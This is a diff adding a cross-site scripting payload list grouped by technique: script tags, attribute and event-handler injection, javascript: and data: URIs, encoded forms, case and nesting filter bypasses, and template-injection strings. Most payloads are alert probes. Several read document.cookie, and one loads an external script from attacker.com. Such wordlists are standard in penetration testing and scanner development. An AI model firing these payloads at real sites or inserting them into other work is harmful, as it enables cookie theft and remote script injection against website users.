@@ -1,0 +1,50 @@
+# Cross-Site Scripting (XSS) payloads
+# Covers reflected, DOM-based, and filter-bypass variants.
+
+# --- Basic script injection ---
+<script>alert(1)</script>
+<script>alert('xss')</script>
+<script src=//attacker.com/x.js></script>
+</script><script>alert(1)</script>
+
+# --- Attribute injection ---
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# --- Event handlers ---
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(document.cookie)">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+
+# --- JavaScript URI ---
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:void(alert(1))
+data:text/html,<script>alert(1)</script>
+
+# --- Encoded variants ---
+&lt;script&gt;alert(1)&lt;/script&gt;
+%3Cscript%3Ealert(1)%3C/script%3E
+<script>alert(1)</script>
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+# --- Filter bypass ---
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<<script>alert(1)//<</script>
+<script >alert(1)</script >
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# --- Template literal / DOM ---
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+<iframe src="javascript:alert(1)">
